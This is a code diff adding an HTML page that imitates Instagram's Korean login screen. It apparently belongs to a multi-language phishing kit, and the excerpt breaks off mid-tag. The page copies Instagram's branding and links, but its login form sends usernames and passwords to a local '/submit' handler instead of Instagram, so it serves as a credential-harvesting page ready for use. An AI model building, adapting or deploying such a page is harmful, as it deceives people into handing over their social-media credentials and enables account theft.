@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>로그인 • Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="header">
+        <div class="top">
+            <div class="logo">
+                <img src="images/instagram.png" alt="instagram" style="width: 175px;">
+            </div>
+            <div class="form">
+                <form action="/submit" method="post">
+                    <div class="input_field">
+                        <input type="text" name="username" placeholder="전화 번호, 사용자 이름 또는 이메일" class="input" required>
+                    </div>
+                    <div class="input_field">
+                        <input type="password" name="password" placeholder="암호" class="input" required>
+                    </div>
+                    <div class="btn"><button type="submit">로그인</button></div>
+                </form>
+            </div>
+            <div class="or">
+                <div class="line"></div>
+                <p>또는</p>
+                <div class="line"></div>
+            </div>
+            <div class="dif">
+                <div class="fb">
+                    <img src="images/facebook.png" alt="facebook">
+                    <a href="https://www.facebook.com/login.php">ㅤFacebook으로 로그인</a>
+                </div>
+                <div class="forgot">
+                    <a href="https://www.instagram.com/accounts/password/reset/">비밀번호를 잊으셨나요?</a>
+                </div>
+            </div>
+        </div>
+        <div class="signup">
+            <p>계정이 없으신가요? <a href="https://www.instagram.com/accounts/emailsignup/">가입하기</a></p>
+        </div>
+        <div class="apps">
+            <p>앱을 다운로드하세요.</p>
+            <div class="icons">
+                <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="images/appstore.png" alt="appstore"></a>
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="images/googleplay.png" alt="googleplay"></a>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="links">
+            <ul>
+                <li><a href="https://about.meta.com/">Meta</a></li>
+                <li><a href="https://about.instagram.com/">정보</a></li>
+                <li><a href="https://about.instagram.com/blog">블로그</a></li>
+                <li><a href="https://about.instagram.com/about-us/careers">채용 정보</a></li>
+                <li><a href="https://help.instagram.com/">도움말</a></li>
+                <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
+                <li><a href="https://privacycenter.instagram.com/">개인정보 보호</a></li>
+                <li><a href="https://www.instagram.com/privacy/cookie_settings/">쿠키 설정</a></li>
+                <li><a href="https://help.instagram.com/581066165581870/">약관</a></li>
+                <li><a href="https://www.instagram.com/explore/locations/">장소</a></li>
+                <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
+                <li><a href="https://www.threads.net/">Threads</a></li>
+                <li><a href="https://www.facebook.com/help/instagram/261704639352628">연락처 업로드 및 비사용자</a></li>
+                <li><a href="https://about.meta.com/technologies/meta-verified/">Meta 확인</a></li>
+            </ul>
+        </div>
+    </div>
+    <div class="languages">
+        <select name="languages" id="languages">
+            <option value="en.html">터키어</option>
+            <option value="ar.html">아랍어</option>
+            <option value="cs.html">체코어</option>
+            <option value="da.html">덴마크어</option>
+            <option value="de.html">독일어</option>
+            <option value="el.html">그리스어</option>
+            <option value="af.html">아프리칸스어</option>
+            <option value="en-uk.html">영어 (영국)</option>
+            <option value="es-es.html">스페인어 (스페인)</option>
+            <option value="es.html">스페인어</option>
+            <option value="fa.html">페르시아어</option>
+            <option value="fi.html">핀란드어</option>
+            <option value="fr.html">프랑스어</option>
+            <option value="he.html">히브리어</option>
+            <option value="id.html">인도네시아어</option>
+            <option value="no.html">노르웨이어</option>
+            <option value="nl.html">네덜란드어</option>
+            <option value="pl.html">폴란드어</option>
+            <option value="ru.html">러시아어</option>
+            <option value="sv.html">스웨덴어</option>
+            <option value="fil.html">필리핀어</option>
+            <option value="tr.html">영어</option>
+            <option value="zh-cn.html">중국어(간체)</option>
+            <option value="gu.html">구자라트어</option>
+            <option value="hr.html">크로아티아어</option>
+            <option value="fr-ca.html">프랑스어 (캐나다)</option>
+            <option value="ro.html">루마니아어</option>
+            <option value="sr.html">세르비아어</option>
+        </select>
+    
+        <script>
+            document.getElementById('languages').addEventListener('change', function() {
+                var selectedLanguage = this.value;
+                window.location.href = selectedLanguage;
+            });
+        </script>
+                
+        <p id="cinsta">© 2024 인스타그램, Meta로부터</p>
+    </div>
+    
+</
